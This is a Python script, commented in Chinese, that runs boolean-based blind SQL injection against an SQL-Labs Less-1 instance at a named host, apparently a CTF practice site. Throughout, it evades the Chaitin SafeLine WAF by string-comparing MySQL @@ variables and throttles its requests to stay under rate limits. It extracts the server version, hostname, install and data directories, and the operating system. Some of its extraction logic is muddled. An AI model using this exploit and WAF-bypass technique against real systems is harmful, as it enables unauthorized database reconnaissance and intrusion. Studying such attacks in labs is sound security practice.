#!/usr/bin/env python3
"""
SQL-Labs Less-1 长亭雷池WAF绕过 - 布尔盲注 v3
字符串比较方式: @@var > 'prefix'

实现原理: 
  - 唯一可用的布尔盲注方式是 @@系统变量 + 字符串比较(> <)
  - 用 A-Za-z0-9_.-/ 字符集做精确匹配
"""

import urllib.request
import urllib.parse
import sys
import time

TARGET = "http://home.ctfstu.cn:6868/sql/Less-1/"
TRUE_LEN = 0
FALSE_LEN = 0

def http_get(url):
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=8) as resp:
            return len(resp.read())
    except Exception:
        return -1

def calibrate():
    global TRUE_LEN, FALSE_LEN
    true_url = TARGET + "?id=1'%20%26%26%201=1--+"
    false_url = TARGET + "?id=1'%20%26%26%201=2--+"
    TRUE_LEN = http_get(true_url)
    FALSE_LEN = http_get(false_url)
    print(f"[*] TRUE={TRUE_LEN}  FALSE={FALSE_LEN}")
    if TRUE_LEN == FALSE_LEN:
        print("[!] 校准失败!")
        sys.exit(1)

def check(cond):
    """构造布尔条件并判断真伪"""
    encoded_cond = urllib.parse.quote(cond, safe='')
    full_url = f"{TARGET}?id=1'%20%26%26%20{encoded_cond}--+"
    length = http_get(full_url)
    if length < 0:
        return None
    # 在 TRUE 和 FALSE 间做比较
    diff_true = abs(length - TRUE_LEN)
    diff_false = abs(length - FALSE_LEN)
    return diff_true < diff_false

def extract(var_name, display_name, max_chars=80):
    """
    提取 @@变量值
    用 字符集遍历 + 字符串比较 来精确提取
    """
    print(f"\n[*] 提取 {display_name} ({var_name})...")
    
    CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_,/:@! "
    
    # 先确认变量存在
    if check(f"{var_name}%20%3e%20''") != True:
        print(f"[-] {var_name} 不可用")
        return None
    
    result = ""
    for pos in range(1, max_chars + 1):
        found = False
        for ch in CHARSET:
            # 构造: @@var > 'result+ch' 
            # 如果为 FALSE → @@var <= 'result+ch' → 当前字符可能是 ch
            # 再确认 @@var > 'result' 为 TRUE (说明还有更多字符)
            test_prefix = f"'{result}{ch}'"
            cond = f"{var_name}%20%3e%20{urllib.parse.quote(test_prefix, safe='')}"
            
            is_greater = check(cond)
            if is_greater is None:
                print(f"\n[!] 请求失败，跳过")
                continue
            
            if not is_greater:
                # @@var > 'result+ch' 为 FALSE
                # 说明 @@var <= 'result+ch'
                # 确认当前字符不是result的结束
                if result:
                    prev_prefix = f"'{result}'"
                    prev_cond = f"{var_name}%20%3e%20{urllib.parse.quote(prev_prefix, safe='')}"
                    if check(prev_cond):
                        # @@var > 'result' 为 TRUE 且 @@var > 'result+ch' 为 FALSE
                        # → ch 是正确字符
                        result += ch
                        found = True
                        break
                    else:
                        # @@var > 'result' 也为 FALSE → 已经到末尾了
                        # 说明result就是完整值
                        print(f"\n[✓] {display_name}: {result}")
                        return result
                else:
                    # 第一个字符：@@var > 'ch' 为 TRUE
                    # 说明 var > ch，继续
                    # 如果 @@var > 'ch' 为 FALSE，说明 var <= ch
                    # 再确认 @@var > chr(ord(ch)-1) 是否真
                    if ord(ch) > 32:
                        prev_ch = chr(ord(ch) - 1)
                        if prev_ch in CHARSET or True:
                            test_prev = f"'{prev_ch}'"
                            prev_cond = f"{var_name}%20%3e%20{urllib.parse.quote(test_prev, safe='')}"
                            if check(prev_cond):
                                # var > prev_ch 为真 且 var > ch 为假 → ch 就是正确字符
                                result += ch
                                found = True
                                break
                            else:
                                continue
                    else:
                        continue
        
        if not found:
            # check if we've hit the end
            if result:
                cur_prefix = f"'{result}'"
                cur_cond = f"{var_name}%20%3e%20{urllib.parse.quote(cur_prefix, safe='')}"
                if not check(cur_cond):
                    print(f"\n[✓] {display_name}: {result}")
                    return result
                # try binary search for this position
                low, high = 32, 126
                while low <= high:
                    mid = (low + high) // 2
                    test_str = f"'{result}{chr(mid)}'"
                    cond = f"{var_name}%20%3e%20{urllib.parse.quote(test_str, safe='')}"
                    r = check(cond)
                    if r is None:
                        break
                    if r:
                        low = mid + 1
                    else:
                        # check if mid is the char
                        if mid > 32:
                            prev_str = f"'{result}{chr(mid-1)}'"
                            prev_cond = f"{var_name}%20%3e%20{urllib.parse.quote(prev_str, safe='')}"
                            if check(prev_cond):
                                result += chr(mid)
                                found = True
                                break
                        high = mid - 1
                if not found and low <= 126:
                    result += chr(low)
                    found = True
        
        if not found:
            print(f"\n[!] 位置 {pos} 无法匹配，结束")
            break
        
        print(f"\r  [{pos}] {result}", end="", flush=True)
    
    return result

def main():
    print("=" * 65)
    print("  SQL-Labs Less-1 | 长亭雷池WAF绕过 | 布尔盲注 v3")
    print("=" * 65)
    
    calibrate()

    variables = [
        ("@@version", "MySQL版本"),
        ("@@hostname", "主机名"),
        ("@@basedir", "安装目录"),
        ("@@datadir", "数据目录"),
        ("@@version_compile_os", "操作系统"),
    ]
    
    results = {}
    for var, name in variables:
        val = extract(var, name)
        if val:
            results[name] = val
        # 歇一下，别触发WAF频率限制
        time.sleep(0.3)
    
    print("\n\n" + "=" * 65)
    print("  提取结果")
    print("=" * 65)
    for name, value in results.items():
        print(f"  {name}: {value}")

if __name__ == "__main__":
    main()
